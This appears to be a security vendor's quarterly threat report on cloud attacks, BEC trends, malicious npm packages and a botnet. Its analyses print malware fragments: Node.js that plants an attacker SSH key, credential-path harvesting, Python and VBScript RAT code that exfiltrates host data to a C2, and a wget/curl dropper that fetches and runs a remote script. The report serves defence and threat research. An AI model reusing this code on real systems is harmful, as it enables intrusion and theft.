@@ -1,0 +1,231 @@
+Datadog threat roundup: Top insights for Q1 2025
+As a leading provider in observability and cloud security, Datadog has unique insight into threat actor behavior that targets cloud infrastructure and the software supply chain. This report summarizes notable threats and insights identified by our Security Research teams throughout the first quarter (Q1) of 2025.
+Key trends and observations
+Our threat research and detection engineering efforts throughout Q1 revealed several significant patterns in the cloud threat landscape, with some notable shifts from previous quarters.
+Cloud control plane remains the primary target
+Attacks of the cloud control plane continue to dominate the threat landscape, representing approximately 47% of all findings in Q1. This number represents a slight increase from last quarter (44%), indicating that threat actors' focus on this attack surface remains persistent. AWS services continue to be the most targeted (59% of incidents), with Amazon SES discovery attempts by long-term access keys remaining the most common attack vector. The prevalence of attacks that use compromised access keys underscores the continued importance of proper key management and rotation policies.
+Business email compromise shows evolving tactics
+Business email compromise (BEC) attacks remain a significant threat, accounting for approximately 28% of all identified incidents in Q1. Although this number represents a slight decrease from last quarter (33%), we've observed refinement in tactics used by threat actors. Microsoft Exchange Online inbox rule manipulation continues to be a primary method, which suggests that threat actors are finding success with this well-established technique. However, we've also noted an increase in OAuth consent phishing attacks. This increase indicates a diversification of BEC tactics and continued evolution in offensive capabilities employed by adversaries.
+Name-squatting in malicious packages remains a prevalent threat
+Ongoing analysis of malicious packages across PyPI and npm reveals that name-squatting is a prevalent tactic, with 18.6% of the malicious packages we reviewed impersonating well-known names. Specifically, 10.4% mimic popular technologies (e.g., Node.js, OAuth), 6.7% target major companies (e.g., Google, Facebook), and 1.5% reference cryptocurrency projects (e.g., Solana). These findings suggest a deliberate strategy by attackers to exploit familiarity and trust in popular names.
+MUT-1692 compromises Rspack maintainer’s account to distribute cryptojacking and infostealer malware
+As part of our ongoing efforts to secure the software supply chain, we uncovered a coordinated cryptojacking and credential-stealing campaign targeting Linux developers through malicious npm packages. Thanks to GuardDog source code heuristics, we were alerted to suspicious activity in a package named argus3-test during routine triage of GuardDog findings.
+The name of this package is an attempt to impersonate argus, a tool for parsing complex data from command-line arguments. After analyzing code within argus3-test, we discovered a malicious postinstall script that attempted to create a socket connection to the threat actor’s command and control (C2) server on Linux devices.
+With the help of npm metadata, we continued to track this threat actor (labeled by Datadog as MUT-1692) and eventually uncovered a more sophisticated attack on npm. MUT-1692 compromised the Rspack project by stealing an npm maintainer’s access token, which allowed them to publish trojanized versions of @rspack/core and @rspack/cli (version 1.1.7 for both). Rspack is a modern module bundler for JavaScript and is intended to assist frontend developers by analyzing JavaScript code and dependencies before building optimized bundles to run that code in the browser.
+According to npm, the Rspack core package has 950,456 weekly downloads. By injecting cryptojacking malware into the official repositories, the threat actor increased their chances of successful distribution among Rspack users who unknowingly installed the compromised packages.
+Technical analysis
+The trojanized Rspack packages contained cryptojacking and infostealer malware, embedded as an obfuscated Node.js script. The script retrieves a JSON file from a GitHub repository named Vant, which contains a base64-encoded payload. After this payload is decoded and saved to the path /tmp/vant, the payload installs a custom fork of the XMRig cryptocurrency miner with a hardcoded configuration. If the primary payload fails, the malware attempts to download and execute the official XMRig installer from GitHub.
+JSON file that contains a base64-encoded version of the Vant payload:
+{
+  "sha": "8ed1c9256b4bfeb3e4f5aaff48bf140398361ae3",
+  "node_id": "MDQ6QmxvYjg4NzE3MjE1OjhlZDFjOTI1NmI0YmZlYjNlNGY1YWFmZjQ4YmYxNDAzOTgzNjFhZTM=",
+  "size": 3557225,
+  "url": "https://api.github.com/repos/youzan/vant/git/blobs/8ed1c9256b4bfeb3e4f5aaff48bf140398361ae3",
+  "content": <base64-encoded version of vant payload>
+  "encoding": "base64"
+}
+The threat actor appears to have specifically targeted developers who use East Asian cloud service providers such as Huawei Cloud, Alibaba Cloud, and Tencent Cloud. The malware searches system directories for credentials associated with these platforms and exfiltrates them to a remote server at 80[.]78[.]28[.]72/tokens.
+A deobfuscated Node.js snippet that shows the malware constructing an array of paths to cloud credential files:
+credential_paths = [username.homedir() + "/.aliyun/config.json", username.homedir() + '/.hcloud/config.json', username.homedir() + "/.tccli/default.credential"];
+Other attacks continuously exploit npm packages to spread backdoor and RAT malware
+In addition to the MUT-1692 campaigns, we identified other unreported campaigns that involved compromised npm packages in Q1. Each of these campaigns was used to deliver backdoor or remote access trojan (RAT) malware. In these attacks, threat actors distributed malware via the npm ecosystem to achieve unauthorized persistent access on compromised hosts, targeting Linux and Windows hosts specifically. These backdoors allowed the threat actors to execute commands, initiate interactive shell sessions, and maintain undetected access.
+MUT-6149: SSH key backdoor via malicious npm packages
+This campaign involved malicious npm packages (grammy-utils, grammyjs-sdk, telegramclient-sdk, telegram-util, and node-tg-bot-api) that exploited name combo-squatting—a technique that combines legitimate package names (grammy and telegram) with auxiliary terms (util or sdk) to appear authentic. These packages replicated genuine package functionality but secretly embedded an additional malicious function named addBotId().
+Malware functionality:
+
+The addBotId() function covertly adds attacker-controlled SSH public keys to the victim’s authorized\_keys file, allowing the threat actor SSH access to the compromised host.
+The function further retrieves the victim’s public IP address via a public service (ipinfo.io) and exfiltrates the IP address and username information to the threat actor through an HTTP GET request to https://grammy.validator[.]icu.
+The exfiltrated IP address and username allow the threat actor to connect back to the compromised host by using the SSH key that they inserted.
+Node.js code to retrieve the user’s public IP address via ipinfo.io:
+function getBotId()  {
+    return new Promise((resolve, reject) => {
+        https.get('https://ipinfo[.]io/ip', (res) => {
+            let data = '';
+            res.on('data', chunk => {
+                data += chunk;
+            });
+            res.on('end', () => {
+                resolve(data.trim());
+            });
+        }).on('error', (err) => {
+            reject(err);
+        });
+    });
+}
+Node.js code to insert an SSH public key into the compromised host:
+const sshDir = path.join(os.homedir(), '.ssh');
+         const authorizedKeysPath = path.join(sshDir, 'authorized_keys');
+
+         if (!fs.existsSync(sshDir)) {
+             fs.mkdirSync(sshDir, { mode: 0o700 });
+         }
+         if (fs.existsSync(authorizedKeysPath)) {
+             // Read the file and check if the public key already exists
+             const fileContent = fs.readFileSync(authorizedKeysPath,  'utf8');
+             if (!fileContent.includes(fullPublicKey)) {
+                 fs.appendFileSync(authorizedKeysPath, `\n${fullPublicKey}`);
+             }
+         } else {
+             fs.writeFileSync(authorizedKeysPath, `${fullPublicKey}\n`, { mode: 0o600 });
+             // console.log('Public key written to new authorized_keys file.');
+         }
+Infrastructure analysis and additional findings:
+After analyzing the malicious packages, we analyzed package contents and metadata that revealed further activity by MUT-6149. We identified the following 11 npm packages and attributed them to MUT-6149, based on reuse of the SSH public key:
+
+node-tg-bot-api
+grammyjs-sdk
+telegramclient-sdk
+grammy-utils
+telegram-util
+node-telegram-bot-sdk
+node-telegram-sdk
+hardhat-configs
+telegramclient-utils
+grammyjs-utils
+solana-web3.js
+We also discovered handles and email addresses operated by the threat actor. We used npm maintainer metadata to tie these handles and email addresses to specific packages:
+
+silverlight (cryptoshiny1224@gmail[.]com):
+
+node-tg-bot-api
+grammyjs-sdk
+telegramclient-sdk
+
+node-tg-bot-api
+grammyjs-sdk
+telegramclient-sdk
+jordanjack1022 (jordanjack1022@gmail[.]com):
+
+grammy-utils
+telegram-util
+node-telegram-bot-sdk
+node-telegram-sdk
+
+grammy-utils
+telegram-util
+node-telegram-bot-sdk
+node-telegram-sdk
+cryptoshiny[.]com (nightfury98760@gmail[.]com):
+
+hardhat-configs
+telegramclient-utils
+grammyjs-utils
+solana-web3.js
+
+hardhat-configs
+telegramclient-utils
+grammyjs-utils
+solana-web3.js
+Pivoting on the nightfury98760 handle, we encountered a GitHub profile with the name QuaiDev that we assess with medium confidence is being operated by MUT-6149. Quai is a reference to the Quai network, a decentralized network for cryptocurrency transactions. This name suggests that MUT-6149 is interested in cryptocurrency and potentially contributes to cryptocurrency-related projects.
+Further corroborating this hypothesis, we analyzed users that the QuaiDev account follows. We discovered a user named jdowning100, also known as Jonathan Downing. This user is a maintainer for the npm package @quai/hardhat-deploy-metadata and uses the handle jonathan.quai. Hardhat is a development environment for the Ethereum blockchain, further corroborating the theory that MUT-6149 is involved with or interested in cryptocurrency technologies.
+We assess with medium confidence that Jonathan Downing’s online persona gave inspiration to MUT-6149 as MUT-6149 attempted to typosquat a hardhat package and repurpose the Quai name for their GitHub profile.
+Python and VBScript RAT for persistent C2
+Over the course of Q1, we spotted another campaign that abused the npm ecosystem to deliver RAT malware. A malicious package named transaction-generator (version 1.1.2) was published to npm and contained Python and VBScript malware specifically designed for persistent C2 on compromised hosts. This campaign targeted Linux and Windows users (likely developers) reliant on npm.
+Malicious behavior (Python payload, Linux-specific):
+A unique 12-character object ID is generated that identifies each infected host:
+def GetObjID():
+    return ''.join(random.choice(string.ascii_letters) for _ in range(12))
+System information such as OS details and hostname are collected, ready to be sent back to the C2 server:
+szPCode = "Operating System : " + GetOSString()
+szComputerName = "Computer Name : " + socket.gethostname()
+The threat actor then crafts an encrypted packet with the gathered user data. Encryption is performed via XOR with a 16-byte key. The ciphertext is then encoded in base64:
+def MakeRequestPacket(szContents):
+    szCID = "FD429DEABE"
+    szStep = "\r\n\t\tStep1 : KeepLink(P)\r\n"
+    if not szContents:
+        szData = szStep + szPCode + "\r\n" + szComputerName + "\r\n" + szContents
+    else:
+        szData = szContents
+
+    lszRequest = "id=" + szCID + "&oid=" + szObjectID + "&data="
+    lpRequest = get_bytes_from_unicode(szData)
+    lpRequestEnc = xor_encrypt_decrypt(lpRequest, KEY)
+    szb64Data = base64.b64encode(lpRequestEnc).decode()
+    lszRequest += szb64Data
+    return lszRequest
+After the data is encrypted, the threat actor exfiltrates it via an HTTP POST request to the C2 server. The request includes the unique ID mentioned previously and is sent using a browser-like user agent for stealth purposes:
+def HTTP_POST(url, data):
+    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ..."
+    encoded_data = data.encode('utf-8')
+    context = ssl._create_unverified_context()
+    n_request = urllib.request.Request(url, data=encoded_data)
+    n_request.add_header('User-Agent', user_agent)
+
+    with urllib.request.urlopen(n_request, context=context) as response:
+        return response.read().decode('utf-8')
+User agent string:
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+After performing the initial exfiltration, the malware enters an infinite loop to await further commands. Data that is returned from the C2 server is also XOR encrypted and base64-encoded. The malware decrypts these packets and checks for a command identifier.
+If an identifier of 1001 is received, the malware interprets the body of the request as Python code and executes it. The threat actor can then execute virtually anything they want on the compromised host.
+If an identifier of 1002 is received, the malware sleeps for 20 seconds before polling for subsequent commands.
+Malicious behavior (VBScript payload, Windows-specific):
+The VBScript payload had much of the same functionality as the Python payload. The same system enumeration was performed, and the data was encrypted and exfiltrated back to the attacker’s C2 server:
+Function MakeRequestPacket(szContents)
+    Dim szCID,szStep,lszRequest,lpRequest,lpRequestEnc,szb64Data
+    szCID = "FD429DEABE"
+    szStep = vbNewLine & vbTab & vbTab & "Step1 : KeepLink(V)" & vbNewLine
+    If Len(szContents) = 0 Then
+        szData = szStep & szPCode & vbNewLine & szComputerName & vbNewLine & szContents
+    Else
+        szData = szContents
+    End If
+    lszRequest = "id=" + szCID + "&oid=" + szObjectID + "&data="
+    lpRequest = GetUnicodeBytes(szData)
+    lpRequestEnc = XOREncryptDecryptByteArray(lpRequest,Key)
+    szb64Data = ByteArrayToBase64String(lpRequestEnc)
+    lszRequest = lszRequest + szb64Data
+    MakeRequestPacket = lszRequest
+End Function
+The main difference with the Windows variant was the use of Windows APIs and features to perform the system enumeration. For example, the operating system version was extracted from the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName key, and the hostname was retrieved via the %COMPUTERNAME% environment variable.
+Actions on objective:
+We used several honeypots that ran the previously mentioned malware samples in an attempt to lure the threat actor to our infrastructure and analyze any post-exploitation activities. Unfortunately, the threat actor did not connect to our infrastructure, so we could not determine the intended objective of this campaign. This outcome suggests that the campaign is targeted and that the threat actor is waiting on specific configurations or hosts from particular geographical locations to connect. We will continue to monitor this threat cluster and will publish a long-form blog post with any new findings.
+Customer infrastructure is abused to host censorship-bypass proxies that use the Xray protocol
+Equipped with indicators from our own research and third-party threat intelligence, detection engineers and security researchers at Datadog regularly perform threat hunting in customer environments. During one recent hunting session, we identified a case where a customer in the education sector had their infrastructure abused to host censorship-bypass proxies that used the Xray protocol. Originally designed to help users learn technologies such as Git and Docker in isolated containers, this infrastructure inadvertently provided an ideal environment for threat actors that were seeking free resources for malicious purposes.
+Previous hunting efforts identified cases where users of this same platform were deploying a cryptocurrency miner and Pterodactyl, a game server management panel. We noted that one particularly aggressive attacker created over 55 container instances from a single IP address, highlighting the scale and persistence of the abuse.
+Deployment of Xray and x-ui
+In the censorship-bypass case, the attacker installed x-ui, a user interface and server implementation for the Xray protocol. Xray is specifically designed to circumvent internet censorship, making it popular among users that attempt to evade government-imposed restrictions in countries such as China and Iran. While Xray itself is not inherently malicious, threat actors often use such censorship circumvention tools to route illicit or harmful traffic through compromised infrastructure, effectively masking their activities and locations.
+Risks and implications:
+While the motivation behind deploying censorship-bypass tools could range from benign censorship evasion to malicious intent, the unauthorized use of such tools on customer infrastructure presents the following risks:
+
+Legal liability: Hosting proxies or VPN-like services could unintentionally place infrastructure operators at legal risk.
+Reputational damage: Infrastructure might be added to denylists or marked as suspicious due to the nature of traffic routed through it.
+Resource exhaustion: Persistent abuse negatively impacts legitimate users by degrading infrastructure performance or availability.
+Given the difficulty of distinguishing between legitimate and malicious use of censorship bypass tools, we assess that such compromised infrastructure is unlikely to be limited to purely “clean” traffic.
+XorBot botnet targets diverse infrastructure
+In our effort to monitor threats against cloud infrastructure, one of our honeypots that was simulating vulnerable Spring Boot instances captured an exploitation attempt. We collect all our honeypot logs in Datadog and then aggregate unique campaigns within our threat intelligence platform, offering unique insights into evolving botnet threats.
+Captured malicious payload
+Our honeypot detected the following payload that indicated remote command execution attempts:
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
+rm bins.sh
+wget http[://]37.44[.]238.88/bins.sh
+curl -O http[://]37.44[.]238.88/bins.sh
+/bin/busybox wget http[://]37.44[.]238.88/bins.sh
+chmod 777 bins.sh
+./bins.sh
+This initial script (bins.sh) acts as a dropper, specifically designed to target and execute binaries tailored for multiple architectures (e.g., ARM, MIPS, x86, PowerPC, SPARC). This approach suggests wide-scale and opportunistic exploitation aimed at IoT devices, cloud containers, and other vulnerable internet-facing systems.
+Deeper analysis: Multi-stage payload
+Further investigation revealed that the malicious script downloads additional payloads designed to exploit numerous vulnerabilities across widely used devices and protocols such as:
+
+GPON routers: Perform command injection by exploiting vulnerabilities to gain remote code execution.
+UPnP services: Abuse Universal Plug and Play functionalities to execute commands remotely via malicious XML SOAP payloads.
+Netgear routers: Exploit known vulnerabilities through crafted HTTP GET requests.
+Huawei home gateways: Exploit weak credentials and firmware vulnerabilities via HTTP POST requests.
+Notably, a very distinctive user agent (masjesu) was consistently employed.
+Link to XorBot botnet and its evolution
+The unusual masjesu user agent is a recognized signature linked to the XorBot botnet, first documented by NSFOCUS in late 2023. Initially, XorBot was known for stealthy behavior, XOR encryption for obfuscation, and evasion techniques.
+In-the-wild scanning
+Currently, we are seeing a relatively low number of scans from this botnet in the wild. However, after a drop of scans for two weeks, the activity is increasing.
+Indicators of Compromise (IoCs)
+
+Malicious IP: 37.44.238\[.\]88 (down)
+Distinctive user agent: masjesu
+bins.sh:512c85432f47149b04a2620dea12b2520857884e398b886d768468a16ced73d5
+Looking ahead
+The trends that we observed in Q1 suggest a continuing focus on cloud control plane targets, with slight shifts in the distribution of attack types. The persistence of well-known attack vectors such as Amazon SES discovery attempts and Microsoft Exchange Online inbox rule manipulation indicates that many organizations are actively working through deploying foundational security controls.
+Organizations should prioritize:
+
+Implementing robust access key management with proper rotation and monitoring
+Enhancing detection capabilities for business email compromise, particularly around inbox rules and OAuth consent grants
+Ensuring robust security coverage across all primary attack surfaces
+Methodology
+The Datadog Security Research team leverages high-confidence security signals as starting points for deeper investigation across customer cloud environments to capture data on trends impacting the cloud threat landscape. By pivoting from known attack attributes into raw telemetry data captured by Datadog's security products, researchers effectively identify emerging threat patterns and compromises that might otherwise go undetected. This methodology not only improves customer security posture through timely notifications of potential compromises but also creates a valuable feedback loop that continuously enhances detection capabilities.
